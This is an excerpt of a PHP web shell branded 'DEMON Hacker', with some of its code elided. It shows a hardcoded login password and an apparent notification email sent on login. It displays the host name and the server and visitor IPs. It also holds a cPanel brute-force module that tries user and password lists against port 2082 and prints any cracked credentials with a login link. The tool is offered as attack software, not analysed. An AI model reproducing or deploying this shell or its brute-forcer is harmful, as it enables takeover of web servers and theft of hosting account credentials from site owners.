...
$admin = array();
$admin['check'] = true;
$admin['pass'] = 'niemdamme'; // Password login
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
...
if ($admin['check']) {
    if ($doing == 'login') {
        if ($admin['pass'] == $password) {
            ...
            $to_email = 'hoangtrunganh01@gmail.com';
...
<BR><BR><div align=center><font  style="color:#00e400;">Welcome to Shell of  DEMON Hacker! - Please wait...<BR><img src=http://i.imgur.com/UwF8H.gif></div>');
            exit;
        } else {
            echo $err_mess;
        }
...
<link rel="icon" href="http://i568.photobucket.com/albums/ss123/wolftg/skull-1.gif" type="image/x-icon">
<title><?php echo str_replace('.', '', '.Hacker DEMON  Anonymous VN..'); ?></title>
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="head_small">
		...
		<table width=100%><tr class="head_small"><td  width="150px"><a href="<?php $self; ?>"><img src="http://nu5.upanh.com/b1.s32.d2/51ab633c252736e8dd8ca3e03ca992b2_52892335.hackerndm.jpg
" width="195" height=240 border=0></a></td>

		<td>

		<span style="float:left;"> <?php echo "Hostname: " . $_SERVER['HTTP_HOST'] . ""; ?> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span></br>
...
?>		</td>
	...
	<tr class="alt1">
		...
		<td  width=100%><span style="float:left;">[Server IP: <?php echo "<font color='#00e400'>" . gethostbyname($_SERVER['SERVER_NAME']) . "</font>"; ?> - Your IP: <?php echo "<font color='#00e400'>" . $_SERVER['REMOTE_ADDR'] . "</font>"; ?>] </span><br />
<center>------------------------------------------------------------------------------------------</center><br />
...
<b> Attacking has been done! Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font> => <a href=http://$user:$pass@$host:2082 target=_blank>Login</a></b><br>");
    ...
    function cpanel_check($host, $user, $pass, $timeout) {
        ...
        if (curl_errno($ch) == 28) {
            ...
            p("<b>[ Leorius@live.com ]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");
        }
        curl_close($ch);
    }
    if (isset($submit) && !empty($submit)) {
        $userlist = explode("\n", $users);
        $passlist = explode("\n", $pass);
        p('<b>[ Leorius@live.com ]# Attacking ...</font></b><br>');
...
ob_end_flush(); ?></span>
	...
	Copyright (C) 2013 - Develop by <a herf="http://google.com">DEMON Hacker</a> - ANONYMOUS - Team - Vietnamese Hackers World
